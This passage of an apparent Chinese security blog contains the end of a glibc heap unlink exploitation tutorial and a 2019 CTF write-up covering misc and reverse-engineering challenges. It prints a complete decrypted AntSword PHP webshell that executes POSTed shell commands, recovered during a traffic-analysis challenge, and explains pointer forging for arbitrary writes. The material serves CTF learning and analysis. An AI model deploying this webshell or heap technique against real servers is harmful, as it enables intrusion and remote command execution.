操作</li></ul><p>则此时，<strong>P</strong>即为<strong>Nextchunk</strong>，<strong>FD</strong>是<strong>Q</strong>，<strong>BF</strong>是<strong>Nextchunk of Nextchunk</strong></p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E8%AF%A6%E8%A7%A3UnLink/QQ%E5%9B%BE%E7%89%8720191121011336.png" alt></p><p>此时横向内存布局也是Low Address ——&gt; High Address</p><table><thead><tr><th align="center">Q（FD）</th><th align="center">Nextchunk（P）</th><th align="center">Nextchunk of Nextchunk（BK）</th></tr></thead><tbody><tr><td align="center"><strong>Low Address</strong></td><td align="center"></td><td align="center">High Address</td></tr></tbody></table><p>那么 unlink 具体执行的效果是什么样子呢？我们可以来分析一下</p><ul><li><strong>FD=P-&gt;fd</strong>  = <strong>Nextchunk address - 12</strong><ul><li><strong>FD = Q</strong></li></ul></li><li><strong>BK=P-&gt;bk</strong> <ul><li><strong>BK = Nextchunk of Nextchunk</strong></li></ul></li><li><strong>FD-&gt;bk = BK</strong> <ul><li><strong>Q-&gt;bk = Nextchunk of Nextchunk</strong></li></ul></li><li><strong>BK-&gt;fd = FD</strong><ul><li><strong>Nextchunk of Nextchunk-&gt;fd = Q</strong></li></ul></li></ul><p>注意到倘若我们能修改<strong>Nextchunk</strong>的<strong>fd</strong>和<strong>bk</strong>，将<strong>fd</strong>和<strong>bk</strong>指向虚构的<strong>chunk</strong>地址，那么就有可能实现任意地址读写，那么假设我们把<strong>Nextchunk</strong>的<strong>fd</strong>设定为<strong>target addr -12 **,</strong>bk<strong>设定为</strong>expect value**，那么接下来</p><ul><li><strong>FD=P-&gt;fd = target addr -12</strong></li><li><strong>BK=P-&gt;bk = expect value</strong></li><li><strong>FD-&gt;bk = BK，即 *(target addr-12+12)=BK=expect value</strong></li><li><strong>BK-&gt;fd = FD，即 *(expect value +8) = FD = target addr-12</strong></li></ul><p>我们就可以使<strong>target addr</strong> = <strong>expect value</strong>, 看起来我们似乎可以通过 unlink 直接实现任意地址读写的目的，但是我们还是需要确保 expect value +8 地址具有可写的权限</p><p>比如说我们将 target addr 设置为某个 got 表项，那么当程序调用对应的 libc 函数时，就会直接执行我们设置的值（expect value）处的代码。例如我们将free修改为system，当程序执行free的时候就会执行system</p><p><strong>需要注意的是，expect value+8 处的值被破坏了，需要想办法绕过</strong> </p><p>我们刚才考虑的是没有检查的情况，但是一旦加上检查，就没有这么简单了。我们看一下对 fd 和 bk 的检查 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fd bk</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  \</span><br></pre></td></tr></table></figure><p>如果按照我们之前说所的那样修改fd和bk此时</p><ul><li>FD-&gt;bk = target addr - 12 + 12=target_addr</li><li>BK-&gt;fd = expect value + 8 = target addr-12</li></ul><p>就无法通过检查</p><p>首先我们通过覆盖，将 nextchunk 的 FD 指针指向了 fakeFD，将 nextchunk 的 BK 指针指向了 fakeBK 。那么为了通过验证，我们需要</p><ul><li><code>fakeFD -&gt; bk == P</code>  &lt;=&gt;  <code>*(fakeFD + 12) == P</code></li><li><code>fakeBK -&gt; fd == P</code>  &lt;=&gt;  <code>*(fakeBK + 8) == P</code></li></ul><p>当满足上述两式时，可以进入 Unlink 的环节，进行如下操作：</p><ul><li><code>fakeFD -&gt; bk = fakeBK</code>  &lt;=&gt;  <code>*(fakeFD + 12) = fakeBK</code></li><li><code>fakeBK -&gt; fd = fakeFD</code>  &lt;=&gt;  <code>*(fakeBK + 8) = fakeFD</code></li></ul><p>如果让 fakeFD + 12 和 fakeBK + 8 指向同一个指向 P 的指针，那么：</p><ul><li><code>*P = P - 8</code></li><li><code>*P = P - 12</code></li></ul><p>即通过此方式，P 的指针指向了比自己低 12 的地址处。此方法虽然不可以实现任意地址写，但是可以修改指向 chunk 的指针，这样的修改是可以达到一定的效果的。</p><p>需要注意的是，这里我们并没有违背下面的约束，因为 P 在 Unlink 前是指向正确的 chunk 的指针。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span><br><span class="line">if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</span><br><span class="line">  malloc_printerr (&quot;corrupted size vs. prev_size&quot;);               \</span><br></pre></td></tr></table></figure><p><strong>此外，其实如果我们设置 next chunk 的 fd 和 bk 均为 nextchunk 的地址也是可以绕过上面的检测的。但是这样的话，并不能达到修改指针内容的效果</strong></p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ol><li>UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针</li><li>已知位置存在一个指针指向可进行 UAF 的 chunk</li></ol><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p>使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>设指向可 UAF chunk 的指针的地址为 ptr</p><ol><li>修改 fd 为 ptr - 0x18</li><li>修改 bk 为 ptr - 0x10</li><li>触发 unlink</li></ol><p>ptr 处的指针会变为 ptr - 0x18</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019高校运维赛WriteUp</title>
      <link href="/2019/11/21/2019%E2%95%95%E2%96%80%E2%95%A8%C3%BA%E2%95%98%E2%95%A6%E2%95%AC%C2%BC%E2%95%9A%E2%81%BFWriteUp/"/>
      <url>/2019/11/21/2019%E2%95%95%E2%96%80%E2%95%A8%C3%BA%E2%95%98%E2%95%A6%E2%95%AC%C2%BC%E2%95%9A%E2%81%BFWriteUp/</url>
      
        <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="0x01-misc1"><a href="#0x01-misc1" class="headerlink" title="0x01 misc1"></a>0x01 misc1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">'724c6e962216407fa5fa1ad7efda2653_misc1_flag.txt'</span>,<span class="string">'rb'</span>)</span><br><span class="line">b = f.read()</span><br><span class="line">a = []</span><br><span class="line">max = int(<span class="number">0</span>)</span><br><span class="line">min = int(<span class="number">999</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    t = i</span><br><span class="line">    <span class="keyword">if</span> t &gt;= max:</span><br><span class="line">        max = i</span><br><span class="line">    <span class="keyword">if</span> t &lt;= min:</span><br><span class="line">        min = i</span><br><span class="line">    a.append(hex(i))</span><br><span class="line">print(hex(max))</span><br><span class="line">print(hex(min))</span><br></pre></td></tr></table></figure><p>导出数据观察可以发现最小值为0x2，最大值为0xF9，根据判断可见字符在这个范围内的应该为EBCDIC编码，且是CP1146（IBM EBCDIC英国编码）<br>可以编写解码脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> ebcdic</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> codecs.open(<span class="string">"724c6e962216407fa5fa1ad7efda2653_misc1_flag.txt"</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> input_file:</span><br><span class="line">        print(input_file.read().decode(<span class="string">'cp1146'</span>))</span><br><span class="line">decode()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ñBuCðCx:¦@B©B£BvC·BðB¯BlB¾$EBCDIC: /eb´s@·dik/, /eb´see`dik/, /eb´k@·dik/, n. [abbreviation, Extended Binary Coded Decimal Interchange Code] An alleged character set used on IBM dinosaurs. It exists in at least six mutually incompatible versions, all featuring such delights as non-contiguous letter sequences and the absence of several ASCII punctuation characters fairly important for modern computer languages (exactly which characters are absent varies according to which version of EBCDIC you&apos;re looking at). IBM adapted EBCDIC from punched card code in the early 1960s and promulgated it as a customer-control tactic (see connector conspiracy), spurning the already established ASCII standard. Today, IBM claims to be an open-systems company, but IBM&apos;s own description of the EBCDIC variants and how to convert between them is still internally classified top-secret, burn-before-reading. Hackers blanch at the very name of EBCDIC and consider it a manifestation of purest evil.flag is flag&#123;0a07c11e46af753fd24d40023f0fdce1&#125;</span><br></pre></td></tr></table></figure><p>最简单的方法是使用WPS Word打开文件，文件 -&gt; 文件 -&gt; 重新载入 -&gt; IBM EBCDIC英国编码</p><h2 id="0x02-misc2"><a href="#0x02-misc2" class="headerlink" title="0x02 misc2"></a>0x02 misc2</h2><p>111.186.57.61:10701</p><p>任意文件读取<br>读取/proc/self/fd/3 得到flag</p><h2 id="0x02-misc3"><a href="#0x02-misc3" class="headerlink" title="0x02 misc3"></a>0x02 misc3</h2><p>使用010editor等十六进制编辑器打开html文件，可看见存在一段由序列<code>E2 80 8C</code>和序列<code>E2 80 8B</code>组成的隐藏字符，把<code>E2 80 8C</code>视为<code>0</code>，<code>E2 80 8B</code>视为<code>1</code>进行转换可得flag<br>在Chrome浏览器的开发者工具中打开也可以发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0827h: E2 80 8C E2 80 8B E2 80 8B E2 80 8C E2 80 8C E2  â€Œâ€‹â€‹â€Œâ€Œâ </span><br><span class="line">0837h: 80 8B E2 80 8B E2 80 8C E2 80 8C E2 80 8B E2 80  €‹â€‹â€Œâ€Œâ€‹â€ </span><br><span class="line">0847h: 8B E2 80 8C E2 80 8B E2 80 8B E2 80 8C E2 80 8C  ‹â€Œâ€‹â€‹â€Œâ€Œ </span><br><span class="line">0857h: E2 80 8C E2 80 8B E2 80 8B E2 80 8C E2 80 8C E2  â€Œâ€‹â€‹â€Œâ€Œâ </span><br><span class="line">0867h: 80 8C E2 80 8C E2 80 8B E2 80 8C E2 80 8B E2 80  €Œâ€Œâ€‹â€Œâ€‹â€ </span><br><span class="line">0877h: 8B E2 80 8C E2 80 8C E2 80 8B E2 80 8B E2 80 8B  ‹â€Œâ€Œâ€‹â€‹â€‹ </span><br><span class="line">0887h: E2 80 8C E2 80 8B E2 80 8B E2 80 8B E2 80 8B E2  â€Œâ€‹â€‹â€‹â€‹â </span><br><span class="line">0897h: 80 8C E2 80 8B E2 80 8B E2 80 8C E2 80 8B E2 80  €Œâ€‹â€‹â€Œâ€‹â€ </span><br><span class="line">...</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0000h: 01100110 01101100 01100001 01100111 01111011 01100101 00110010 01100001  flag&#123;e2a </span><br><span class="line">0008h: 00111001 01100011 00111000 01100010 00110001 00110001 00110111 00110101  9c8b1175 </span><br><span class="line">0010h: 01100101 00110110 00110110 01100011 01100110 00110010 00110001 01100110  e66cf21f </span><br><span class="line">0018h: 00111000 00110101 00111001 00110011 01100010 01100011 00111000 00110101  8593bc85 </span><br><span class="line">0020h: 01100010 01100110 00111001 00110011 00111001 01111101                    bf939&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-webshell"><a href="#0x03-webshell" class="headerlink" title="0x03 webshell"></a>0x03 webshell</h2><p>分析流量可知，在服务器上执行的shell解密后大致如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@ini_set(<span class="string">"display_errors"</span>, <span class="string">"0"</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span><span class="params">($out)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    @session_start();</span><br><span class="line">    $key = <span class="string">'f5045b05abe6ec9b1e37fafa851f5de9'</span>;</span><br><span class="line">    <span class="keyword">return</span> @base64_encode(openssl_encrypt(base64_encode($out), <span class="string">'AES-128-ECB'</span>, $key, OPENSSL_RAW_DATA));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $output = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"8c2b4"</span>;</span><br><span class="line">    <span class="keyword">echo</span> @asenc($output);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"e2e10"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $p = base64_decode($_POST[<span class="string">"0x1b4d456c7297d"</span>]);</span><br><span class="line">    $s = base64_decode($_POST[<span class="string">"0xb9b45688a5a08"</span>]);</span><br><span class="line">    $d = dirname($_SERVER[<span class="string">"SCRIPT_FILENAME"</span>]);</span><br><span class="line">    $c = substr($d, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">"/"</span> ? <span class="string">"-c \"&#123;$s&#125;\""</span> : <span class="string">"/c \"&#123;$s&#125;\""</span>;</span><br><span class="line">    $r = <span class="string">"&#123;$p&#125; &#123;$c&#125;"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fe</span><span class="params">($f)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $d = explode(<span class="string">","</span>, @ini_get(<span class="string">"disable_functions"</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($d)) &#123;</span><br><span class="line">            $d = <span class="keyword">array</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $d = array_map(<span class="string">'trim'</span>, array_map(<span class="string">'strtolower'</span>, $d));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (function_exists($f) &amp;&amp; is_callable($f) &amp;&amp; !in_array($f, $d));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runcmd</span><span class="params">($c)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ret = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (fe(<span class="string">'system'</span>)) &#123;</span><br><span class="line">            @system($c, $ret);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">'passthru'</span>)) &#123;</span><br><span class="line">            @passthru($c, $ret);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">'shell_exec'</span>)) &#123;</span><br><span class="line">            <span class="keyword">print</span>(@shell_exec($c));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">'exec'</span>)) &#123;</span><br><span class="line">            @exec($c, $o, $ret);</span><br><span class="line">            <span class="keyword">print</span>(join(<span class="string">"</span></span><br><span class="line"><span class="string">"</span>, $o));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">'popen'</span>)) &#123;</span><br><span class="line">            $fp = @popen($c, <span class="string">'r'</span>);</span><br><span class="line">            <span class="keyword">while</span> (!@feof($fp)) &#123;</span><br><span class="line">                <span class="keyword">print</span>(@fgets($fp, <span class="number">2048</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            @pclose($fp);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">'antsystem'</span>)) &#123;</span><br><span class="line">            @antsystem($c);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $ret = <span class="number">127</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ;</span><br><span class="line">    $ret = @runcmd($r . <span class="string">" 2&gt;&amp;1"</span>);</span><br><span class="line">    <span class="keyword">print</span> ($ret != <span class="number">0</span>) ? <span class="string">"ret=&#123;$ret&#125;"</span> : <span class="string">""</span>;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"ERROR://"</span> . $e-&gt;getMessage();</span><br><span class="line">&#125;;</span><br><span class="line">asoutput();</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//ed3edq113</span></span><br></pre></td></tr></table></figure><p>在第七个HTTP流中，读取了flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [4]: base64.b64decode(&apos;Y2QgIi92YXIvd3d3L2h0bWwvdG1wIjtjYXQgZmxhZ3xiYXNlNjQgO2VjaG8gW1NdO3B3ZDtlY2hvIFtFXQ==&apos;)</span><br><span class="line">Out[4]: b&apos;cd &quot;/var/www/html/tmp&quot;;cat flag|base64 ;echo [S];pwd;echo [E]&apos;</span><br></pre></td></tr></table></figure><p>flag经过了一层base64加密，在asoutput方法中增加了前后缀，然后在套一下base64，顺便AES加密<br>响应的内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kRD1eD+vSZ81FAJ6XClabCR0xNFklup5/x+gixas3l0kdMTRZJbqef8foIsWrN5dJHTE0WSW6nn/H6CLFqzeXSR0xNFklup5/x+gixas3l0kdMTRZJbqef8foIsWrN5dZOTFg4DW9MYwG6k3rEvAAR8oFStGnfMRtUJOqc0mgokfKBUrRp3zEbVCTqnNJoKJHygVK0ad8xG1Qk6pzSaCiR8oFStGnfMRtUJOqc0mgokfKBUrRp3zEbVCTqnNJoKJ1qI47Cz1/qfnNoNARGhLfVhC0RJlfeKCvbPwpjFn//BSFY8RJlZyxz1a+TPy0D3cUhWPESZWcsc9Wvkz8tA93FIVjxEmVnLHPVr5M/LQPdxSFY8RJlZyxz1a+TPy0D3cUhWPESZWcsc9Wvkz8tA93GnMvJfVbvphfWnt17IOkzYjvv91k2fnYDR7u4nlGM3YitxGYGs9mn+HS5iJBXORtYrcRmBrPZp/h0uYiQVzkbWK3EZgaz2af4dLmIkFc5G1itxGYGs9mn+HS5iJBXORtUq4dBjDRFhDqDyzs9CScJhrd3yMusQ+qsnZkq4Ey7NVJHTE0WSW6nn/H6CLFqzeXSR0xNFklup5/x+gixas3l0kdMTRZJbqef8foIsWrN5dJHTE0WSW6nn/H6CLFqzeXSR0xNFklup5/x+gixas3l2hDPuDhVN4TaDLzp9bXyfGeCVhvglAaNo2rA/ovnRTTtfA5ZywMOOijj6md5RItqjXwOWcsDDjoo4+pneUSLao18DlnLAw46KOPqZ3lEi2qNfA5ZywMOOijj6md5RItqgS0b9hS7r5TX9YNZo2awgUAyqVacVgwr1NlNQ2k/kihhh0QQfnjeGdZhkz0N0jAKiMzFmAMa7xQ1URxTaHoHjDg3NaWl/8+PVG+pyaKrbNDjfl77POeQE8+0MCHpz6YxWLJ6mwCe1X3uzz/HSHcHSvQBB8FxjOhugOErOXkd3LZi/60Gr4gIEc1JIxA5A2pE/V6Z/DFwNOR4M/IIIWdGr5</span><br></pre></td></tr></table></figure><p>解密脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$r=file_get_contents(<span class="string">"enc"</span>);</span><br><span class="line">$key = <span class="string">'f5045b05abe6ec9b1e37fafa851f5de9'</span>;</span><br><span class="line"><span class="keyword">echo</span> openssl_decrypt(base64_decode($r), <span class="string">'AES-128-ECB'</span>, $key, OPENSSL_RAW_DATA);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>拿到flag:<strong>flag{AntSword_is_Powerful_3222222!!!!}</strong></p><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p><code>init_array</code>和<code>fini_array</code>都有一个函数，在<code>init_array</code>里的函数里加了反调，直接<code>patch</code>即可，然后还把<code>key</code>修改了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">15</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      result = aThisIsNotKey;</span><br><span class="line">      aThisIsNotKey[j] ^= <span class="number">7u</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然后<code>fini_array</code>才是最后的比较函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> __int8)byte_202040[i + <span class="number">0x10</span>];</span><br><span class="line">    <span class="keyword">if</span> ( byte_2020E0[i] != (_BYTE)result )</span><br><span class="line">      v2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>加密函数是RC4算法，解题脚本为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line">key = <span class="string">"sontXntXihsXlb~&amp;"</span></span><br><span class="line">data = <span class="string">"A"</span>*<span class="number">0x10</span></span><br><span class="line">rc41 = ARC4.new(key)</span><br><span class="line"><span class="comment"># part1 = rc41.decrypt('78695a5c2515935f6d150711ee01b3ab'.decode('hex'))</span></span><br><span class="line">part2 = rc41.decrypt(<span class="string">'7f305e5f1619bf7471131025d75fe1ff'</span>.decode(<span class="string">'hex'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> part2</span><br></pre></td></tr></table></figure><h2 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h2><p>32元一次方程组,把数据扣出来在到在线网站上解密（</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># import re</span></span><br><span class="line"><span class="comment"># a = ''' 17153 * a1[27]</span></span><br><span class="line"><span class="comment"># + 41549 * a1[26]</span></span><br><span class="line"><span class="comment"># + 28202 * a1[24]</span></span><br><span class="line"><span class="comment"># + 36806 * a1[23]</span></span><br><span class="line"><span class="comment"># + 12690 * a1[22]</span></span><br><span class="line"><span class="comment"># + 42821 * a1[20]</span></span><br><span class="line"><span class="comment"># + 39834 * a1[19]</span></span><br><span class="line"><span class="comment"># + 17994 * a1[17]</span></span><br><span class="line"><span class="comment"># + 32765 * a1[14]</span></span><br><span class="line"><span class="comment"># + 25687 * a1[10]</span></span><br><span class="line"><span class="comment"># + 33388 * a1[9]</span></span><br><span class="line"><span class="comment"># + 143 * a1[4]</span></span><br><span class="line"><span class="comment"># + 63776 * a1[0]</span></span><br><span class="line"><span class="comment"># + 8682 * a1[1]</span></span><br><span class="line"><span class="comment"># - 16324 * a1[2]</span></span><br><span class="line"><span class="comment"># - 20022 * a1[3]</span></span><br><span class="line"><span class="comment"># - 48973 * a1[5]</span></span><br><span class="line"><span class="comment"># - 57775 * a1[6]</span></span><br><span class="line"><span class="comment"># - 43820 * a1[7]</span></span><br><span class="line"><span class="comment"># - 41070 * a1[8]</span></span><br><span class="line"><span class="comment"># - 15669 * a1[11]</span></span><br><span 